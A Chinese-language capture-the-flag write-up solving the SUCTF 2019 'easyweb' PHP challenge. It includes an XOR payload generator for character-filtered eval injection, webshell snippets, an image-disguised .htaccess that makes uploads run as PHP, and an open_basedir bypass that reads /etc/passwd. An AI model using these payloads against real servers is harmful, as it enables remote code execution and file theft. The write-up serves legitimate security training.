源码：https://github.com/team-su/SUCTF-2019/tree/master/Web/easyweb

主页面给出源码，代码审计

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

首先确定漏洞类型：

```php
$hhh = @$_GET['_'];
#中间很多过滤
eval($hhh);
```

本质上是php注入。使用了eval导致用户提交的参数被当作php代码执行

然后是$_FILES，这是一个处理文件上传的超全局变量：

- $_FILES\["file"\]\["name"\] - 上传文件的名称
- $_FILES\["file"\]\["type"\] - 上传文件的类型
- $_FILES\["file"\][\"size"\] - 上传文件的大小，以字节计
- $_FILES\["file"\]\["tmp_name"\] - 存储在服务器的文件的临时副本的名称
- $_FILES\["file"\]\["error"\] - 由文件上传导致的错误代码

对于上传文件的检查逻辑是：后缀名不能带`ph`，临时文件名（这是就是文件内容）不能带`<?`，最后通过`exif_imagetype()`检查（这个函数仅仅检查文件头，可以伪造绕过）。然后使用`move_uploaded_file`移动文件到指定目录下

首先通过`eval()`执行`get_the_flag()`函数，然后写入webshell，最后蚁剑连接，这是暂时的大概思路。

传入的`$hhh`过滤了很多东西，其中最重要的就是过滤字母和数字。这里参考`php_rce.md`的的无参数rce方法：

- 异或
- 取反
- 自增

有因为过滤了`+`和`~`,而没有过滤`^`,因此选用异或

先构造phpinfo看看信息：

因为过滤单引号和双引号，并且限制了长度，所以正常直接构造phpinfo不行，考虑传入$_GET[a];a=phpinfo,然后传参

```python
import re
import requests

def blacklist(s):
    """返回False代表为被过滤"""
    m = re.compile(r"[\x00-\x320-9a-zA-Z'\"\[\]`~_&.,|=+\x7f]")
    if m.search(s) is None:
        return False
    return True
def realhex(c):
    return "%" + hex(c)[-2:]
def generate_xor_payload(target:str):
    left = []
    right = []
    for char in target:
        found = False
        for i in range(128,256):#这里因为有字符出现次数限制，让左边四字节全为%80
            if blacklist(chr(i)):
                continue
            for j in range(33,256):
                if blacklist(chr(j)):
                    continue
                elif ord(char) == (i ^ j):
                    left.append(i)
                    right.append(j)
                    found = True
                    break
            if found:
                break
    rl = ''
    rr = ''
    for l in left:
        rl += realhex(l)
    for r in right:
        rr += realhex(r)
    return rl + '^' + rr

if __name__ == "__main__":
    result = generate_xor_payload("_GET")
    print(result)
    url = 'http://328cfd4b-0397-4f21-b503-26896485a63a.node5.buuoj.cn:81/'
    payload1 = "?_=${" + result + "}{%80}();&%80=phpinfo"
    # r = requests.get(url=url+payload1)
    # print(r.content.decode())
    print(url+payload1)
```

这里有一点要注意，php在过滤传入的参数`_`的时候，执行了如下代码:

```php
$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");
```

这里是限制你的出现的字符种类不能大于12，于是我们在python脚本中遍历的时候让左边直接从%80开始，跑出来刚好左边四个字节都是%80的时候符合。因此我们构造参数传入，查看phpinfo页面

![image-20250908151443545](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250908151443545.png)

发现phpinfo显示禁用了几乎所有命令执行函数。这里正常有两种方法：LD_PRELOAD手动绕过，或者连上蚁剑利用插件一键绕过。

但是这样都需要先连上蚁剑。php5的话是构造`assert($_POST[_])`php7构造`assert(eval($_POST[_]))`或者用反引号`。但是反引号无回显，可以

- 反弹shell 
- cat文件重定向保存到有权限读取的地方
- echo一下，可以利用短标签比如```cmd=?><?=`{${~"%a0%b8%ba%ab"}{%a0}}`?>&%a0=ls```这里`~"%a0%b8%ba%ab"`就是`_GET`

这里因此直接传入的参数限制太多了，又过滤了反引号，还是要用题目给的函数

但是其实这里直接搜索flag其实就可以得到flag了：
![image-20250908152625654](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250908152625654.png)

我们还是利用一下get_the_flag

上传文件的时候后缀被严格限制了，可以上传.jpg等格式，然后再上传一个.htcess文件指定将它们解析成php

文件内容`<?`被过滤：PHP5.x版本中可以使用 `<script language='php'>eval($_REQUEST['shell']);</script>`来绕过

在这里使用base64编码。问题是怎么解码？

可以在.htaccess文件中加入

`php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_adeee0c170ad4ffb110df0cde294aecd/shell.ha"`

也可以使用别的编码，在.htaccess中使用php_value或者php_flag配置好就可以

同时为了绕过`exif_imagetype`,需要加上图片的幻术头，最简单就是GIF89a

但是这衍生两个问题：

1. base64解码以四个字节为一组，直接把GIF89a放到开头会破坏后面payload的解码
2. 你要写的webshell使用GIF89a可以，但是.htacess不能用这个。

解决也很简单，对于1我们补充两字节数据就可以，对于2则要在.htaccess中预定义长度和宽度，这是XBM的格式，也可以通过`exif_imagetype`，而#在.htaccess中代表注释，不会影响解读指令

``````
#define width 1
#define height 1
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
``````

也可以利用WBMP格式，开头加上\x00\x00\x85\x85

最后一个问题是绕过open_basedir,这是一个限制用户访问文件活动范围的配置。我们在查看phpinfo的可以看到

有很多办法，这里给出利用ini.set绕过方法：

```php
<?php
mkdir('tmpdir');
chdir('tmpdir');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
$a=file_get_contents('/etc/passwd');
var_dump($a);
?>
```

原理如下：

1. **初始设置**：将open_basedir设置为".."（允许访问上级目录）
2. **目录遍历**：通过多次`chdir('..')`跳出限制范围
3. **重置限制**：将open_basedir设置为根目录，完全解除限制
4. **读取敏感文件**：访问本应受保护的系统文件

这本身是利用open_basedir自身的漏洞，原理这里就不再赘述。



总结一下流程：

先无数字字母RCE看phpinfo，然后上传webshell和.htaccess，连上蚁剑后通过ini.set绕过open_basedir限制。